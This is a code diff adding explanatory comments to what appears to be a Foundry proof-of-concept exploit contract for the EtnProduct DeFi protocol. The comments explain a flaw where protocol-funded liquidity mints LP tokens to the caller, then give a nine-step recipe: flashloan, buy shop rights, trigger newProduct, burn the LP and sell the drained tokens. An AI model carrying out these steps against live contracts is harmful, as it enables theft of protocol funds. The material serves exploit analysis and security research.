@@ -81,6 +81,35 @@ contract Exploit is Test {
         BUSDT.transfer(address(msg.sender), c);
     }
 
+    // VULNERABILITY: Protocol-Funded Liquidity Theft via Misassigned LP Tokens in newProduct
+    // Detailed explanation:
+    // The core bug lives in EtnProduct.newProduct() + addLiquidity() [sources/EtnProduct_129226/EtnProduct.sol:102,118].
+    // - EtnProduct holds a large balance of the protocol's U token (0xaa33...).
+    // - Anyone can cheaply acquire "upload rights" by: 1) mintETN (comm NFT, payable in BNB), 2) invite(self, commId) [requires owning the comm], 3) shop.mint(commId,...) paying 1998 USDT. This gives ownership of shop NFT tokenId=commId*100+shopId (shopId starts at 0).
+    // - canUploadProduct(to,comm,shop) simply returns shopNft.ownerOf(tokenId)==to [EtnShop:218].
+    // - newProduct then: creates product ERC20 via factory.createContract(name,name,bytes32(shopTokenId)), records it, then unconditionally calls addLiquidity(erc20Addr).
+    // - addLiquidity does: U.approve(router,700k), token.approve, router.addLiquidity(U, token, 700k,700k,..., msg.sender /*attacker*/, ts).
+    //   The router transferFroms the 700k U FROM EtnProduct (the protocol) and 700k new-tokens (freshly created supply held by EtnProduct) INTO the pair.
+    //   LP tokens are minted to the 'to' = attacker, not owner or contract.
+    // - Because the attacker now owns the LP, they can perform the classic "send LP to pair + burn" to redeem the reserves:
+    //   Pair.transfer(Pair, 600k*1e18); Pair.burn(attacker)  [uses internal balanceOf[pair] as liquidity to burn, sends back proportional reserves = nearly all the 700k U + tokens].
+    // - Recovered U is then dumped into UMarket.saleU(large) which does U.transferFrom(attacker, market, cost) and market sends USDT back (at salePrice = 10/9 ratio).
+    // Code references in PoC: lines 64 (newProduct), 74 (Pair.transfer), 76 (burn), 78-79 (saleU), 48 (hardcoded Pair addr which is the pair created for this U+newtoken), 55 (EtnProduct addr), 40 (U addr).
+    // Why works: 1) LP recipient is attacker not protocol, 2) no timelock or min-LP retention, 3) bootstrap always uses protocol U not caller funds, 4) permissioning via buyable shop-NFT is insufficient for a privileged economic action.
+    // Impact: Theft of protocol U liquidity (converted to ~3074 USD profit after costs). Flashloan used to front the small setup cost.
+    // EXPLOIT STEPS:
+    // 1. Flashloan 9400 BUSDT from DODO DVM (line 58).
+    // 2. Swap 7380 BUSDT->WBNB (line 64) to fund BNB for NFT mint + keep BUSDT for shop mint cost.
+    // 3. approveAll() for max allowances (line 63).
+    // 4. NFT.mintETN{value}(...) to mint a community NFT (line 66).
+    // 5. Shop.invite(this,11); Shop.mint(11,"fw","sb") -> self-grant shop NFT ownership for comm=11/shop=0 (lines 67-68).
+    // 6. etnproduct.newProduct(11,0,1e10,"jb","sb") -> triggers protocol to seed 700k U into attacker-owned LP pair (line 71).
+    // 7. Pair.transfer(Pair,600k ether); Pair.burn(this) -> redeem ~606k U + product tokens (lines 74-76).
+    // 8. U.approve(Market); Market.saleU(11.25e21) -> exchange U for BUSDT via market (lines 78-79).
+    // 9. Repay flashloan (line 81). Attacker profits net after costs.
+    // Interface definitions (local in this file): Etnshop, Etnnft, EtnProduct, Umarket (lines 14-35).
+
+
     function swap_token_to_token(address a, address b, uint256 amount) internal {
         IERC20(a).approve(address(Router), amount);
         address[] memory path = new address[](2);
